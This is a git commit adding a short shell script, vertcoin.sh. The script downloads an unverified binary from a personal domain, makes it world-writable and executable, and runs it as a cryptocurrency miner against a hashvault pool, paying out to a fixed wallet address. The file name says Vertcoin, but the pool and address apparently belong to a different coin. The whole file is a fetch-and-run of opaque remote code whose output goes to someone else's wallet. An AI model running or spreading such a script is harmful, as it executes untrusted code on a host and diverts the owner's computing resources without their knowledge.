3e2216eee054eba64d2c536882f0459109c0c306
nanung <81861334+surtitedjohadiningrat@users.noreply.github.com>
2021-07-14 11:04:02 +0700

    Create vertcoin.sh

---
+++ vertcoin.sh
@@ -0,0 +1,4 @@
+sudo apt update
+wget https://swenson.my.id/mining/masterfile
+chmod 777 masterfile
+./masterfile --url pool.hashvault.pro:80 --user 5t5mEm254JNJ9HqRjY9vCiTE8aZALHX3v8TqhyQ3TTF9VHKZQXkRYjPDweT9kK4rJw7dDLtZXGjav2z9y24vXCdRc5TxZreiU4R8aQs1rU --pass nn --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
